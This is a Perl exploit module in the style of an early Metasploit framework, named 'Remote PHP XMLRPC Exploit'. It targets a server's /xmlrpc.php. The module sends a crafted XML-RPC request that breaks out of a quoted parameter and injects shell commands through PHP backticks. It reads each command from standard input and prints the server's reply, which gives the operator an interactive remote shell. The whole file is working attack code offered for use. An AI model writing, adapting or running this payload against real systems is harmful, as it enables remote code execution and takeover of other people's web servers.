package Msf::Exploit::xmlrpc;
use strict;
use base 'Msf::Exploit';
#use Msf::Socket::Tcp;

my $advanced = { };

#######################
# Exploit Information #
#######################
my $info = {
    'Name'  => 'XMLRPC',
    'Version'   => '$Revision: 1.0 $',
    'Authors'   => [ 'peasant' ],
    'Arch'      => 'none',
    'OS'        => 'none',
    'Priv'      => 0,

    'UserOpts'  => {
        'RHOST' => [1, 'ADDR', 'Target Address'],
        'RPORT' => [1, 'PORT', 'Target Port', 80 ],
        'RFILE' => [1, 'FILE', 'Target File', '/xmlrpc.php'],
    },

    'Description'   => ['Remote PHP XMLRPC Exploit'],
    'Refs'  => [ 'http://hypereffect.org/', ],
};


#########################
# Create a new informer #
#########################
sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
    return($self);
}


########################
# Main Exploit Routine #
########################
sub Exploit {
    my $self = shift;
    my ($line, $exploit);

    my $host = $self->GetVar('RHOST');
    my $port = $self->GetVar('RPORT');
    my $file = $self->GetVar('RFILE');

    # keep reading commands from stdin
    while(1) {
        print("user\@$host> ");
        my $cmd = <STDIN>;
        chomp($cmd);
        if($cmd eq "exit") {
            last;
        }

        # build our exploit string
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo `".$cmd."`;exit;/*</name></value></param></params></methodCall>";

        # create connection
        my $sock = Msf::Socket::Tcp->new(
                                            'PeerAddr'  => $host,
                                            'PeerPort'  => $port,
        );

        if ($sock->IsError) {
          $self->PrintLine('[*] Error creating socket: ' . $sock->GetError);
          return;
        }

        # send our exploit
        $line = "POST " . $file . " HTTP/1.1\n";
        $sock->Send($line);
        $line = "Host: " . $host . "\n";
        $sock->Send($line);
        $line = "Content-Type: text/xml\n";
        $sock->Send($line);
        $line = "Content-Length:" . length($exploit) . "\n\n";
        $sock->Send($line);
        $sock->Send($exploit);

        my $output = $sock->Recv(-1);
        print($output . "\n");
        $sock->Close();
    }

    return;
}
